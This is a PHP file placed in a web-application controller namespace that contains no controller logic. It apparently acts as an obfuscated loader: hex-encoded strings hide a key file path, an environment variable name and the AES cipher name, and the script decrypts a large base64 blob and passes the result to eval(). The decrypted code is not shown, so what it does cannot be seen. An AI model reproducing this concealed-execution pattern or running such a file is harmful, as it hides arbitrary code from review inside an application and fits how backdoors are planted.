<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jf6C4HAFMhmTnROSfXRd3A==');

$c=base64_decode(

'eaE/bKF/d/xMd8Yj/r2t6TofYaAE/gnJLL/2DUjSKR11xRHuvtQ1lJJd/Qtl19Lf5sF24cLkFU1x' .
'1kckQpMLC+8DKVlruc3gWvNp0LAoUem+zN0Q0OaRf38STS6GP3CpTsx/SImRn7S8Sw/CgGi/cNVD' .
'NI6tqH/RWiDJatAyZ6E/+dO9gI1bcSYBSIvpY2ofdAQMte3aY9gR4xqonUu3itjfcdD6my6QSvb2' .
'59TWVc5k9FNQrNtiWoBvrsk1lqhTSm/dnwYMG1UHRQekIxHubWTLPQQpB/6cUDSgBCA1WNop5axL' .
'PBsUHSAIcwPvCY6YGi5Vhs7B+2dGLjbT/jjLa9q64GEWTpFZ/aXqvF1itEtMSvBBroqAYsKMvddV' .
'6/Fz9zdmXWsw4/CKF/cz4+tCdj/7utqr14vFu0V+m9nw1Tqv1hYePiP86i7ClEWgNmKwLscR1qvp' .
'h+YvomUxr1xcRYpqR1Qgn43bl5tcEqHbDcwgO3jXaRkg8L7trJXNlEgdd8vVnU41YhZJL0K6yict' .
'twCnOiHXy568GiGFmxe4w/lgZFKtH3fSTqO6bbu5lh/kcuq7y2Q49RNjdln1RJKWgGLK8SxD3ohr' .
'j40OyQ/j3bdWqsi+5EkMaiEG6lsrb0KplbRRj3MaQivz8HPsFW3KefsoesLc+cZTE+yADTqvqv/4' .
'mwrVpmB4KyiLJMGC788C1J+J3lebMWqQ1bQFWiSpOz10GwkdHXnvg9rcLYVwbKWXaX++BSHrve+D' .
'l7+CugpAxMHfHhvj+pHuf+WNykaCj3MW/ZBWcc3lk0mxwroN0enm40rZPnNqh7lzUrihJuwPbvfE' .
'pqr8DDPWm6FsTokMCwmVS+qQt/sjJMSL1UN5KhA8uyCj8dmo4Z5g7bJkYfLrNHLuGrfSdTMm1Wx2' .
'5dTpI5dMm8wgASrBhG+ut+JBh+0Yby/na8xf9xIPGKGKLmQlSuwQHaVZaj5yXrgVkeqRZ6F1SE6J' .
'4n7i3JS/rDwLfvsGhUx0ccdAD+xbMRbJdYtN1zCbP1fvFo2P4SH+zRWx11ekeRivqy/Wc3l+wEGV' .
'aLQWuzyA5t4NUJcq92gA5ZKef62tVypmPMAl8j6jrDZs3089PX4s3qI+97USN5BjLKL0/VQRtwww' .
'uzX6RkFsP1kDNdsjJW3aoX4cJ26XagTz9077Votxc3cGKN2ki8NBo0QE6kMea63oXXlmvuCzCUx4' .
'v2oAqu7Mhciawn18d4gnmXneWJfnFuUePON4s8GTCqA+CfR2wY/kvd4GdSSEA06T/c08NBrJc9xl' .
'avXF3SsGBuzjTfD8K1rUs0BixuMZ9db8EG5f3mmup3+AzEH+x7h+ob3M5zyFVN2Ubw6GRRwL+3zS' .
'CohHavCleJyOCdoiIYcln7v0EKj2HxllFZ99w2qPmhz2iYoXro/VH6yXNkIr+xeP/APMgg3R5nFM' .
'eleupcfw1oo2UmhXlKoFAAb+9+d3u0N9o8mdiHmN+xe+kspWLenaduhv93Ka31rILLIUP/8JQ/Sd' .
'gJD9d4eYP2Xm22XYoKZgWW3exmFGpamsTNERKLU7lNqMVtrP3nYvkozNlaelD5yffEvPiRihPj2r' .
'jGtvjHhF9u3QsubdTkNjkTDTr2eqbtw7QpJjMJaj+ulf5qktY+OADFqNh2KTT2SN1bKbTPX/KhOy' .
'mlBMXVTsFlLjBwBu8xl33ghnauA91UVdNqAW/LaSVUYxSx/brHwn/3lsUBLo3KD5UMQ5kJ9bhfhe' .
'ZG3882BoDnJgblrdSMnFczbXdA+Hy3DWmLGAy/LJPtVqOD6/7SeuNPOa69OgpeuWw2VICFa2KQG6' .
'BIuOaynuCQrScfto2IzZ091saolvj1QfJ1rU1tt4qri4+cpr97WqCMlDLwjGdlU2BO2v4VK0a86a' .
'ERXiwLwLhDBeR/QZhZ9yGDaxg51WfuTMDT0ZefHGdCdxsrwXcYlgLWUt12lmyaEJYK+Ll5L3itPG' .
'xGo9jXbHqunBZMa0JhAVyAFOmWPkc8y2kpcYLc7QNYcDu+c4y2xn4EA2zCTrICGVnM9DZLZbV/fF' .
'TFU3NOViyz1Ns4/KYW/bcmSi5yBRC7KYAU/WbCS1LpQVhPLxZoQYVDyQ9aZ9Bc71n5rqf9COLzN/' .
'IKuD0hvxOryoN4uywdMxx3SVeksxWrjQYc1D0H6dEEo9xbW6GCKvjXRvpoEzzlMeEyVXF39oxFX2' .
'eqg4tEo/CyO5gHKP3pLqlWqgu4vR0cy7x6XfRolXZPCX2RvciopehejXC8WUNcgswU/UkXbecyhD' .
'q6sZjTPShMQRx576nhmC6Bl+Adog/xcflqv7UyHePAZsNNOO//hDg8lz2GRHIzya0UEAy7g3pgwT' .
'Q+Y7Gyit/wJLTBdbQoT1zI3quKIo3bBNUszeOo1wm45q4nLv9YassTQGO3AzQV0mc713cVLWq3F2' .
'Z6CcqbozEQ6aAL4dxNSpAlpSJaaLRVn10sFR2DDhKYRt/aF1MONIo3zx7+LYt3j215kgWXnGkLKD' .
'O3FjMvQDrCDIEePWNXlog1AUANziHSQj4Z76jyZbhFMCCYE56aSwRlI4rqSf4ewC6s98MOCHtA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

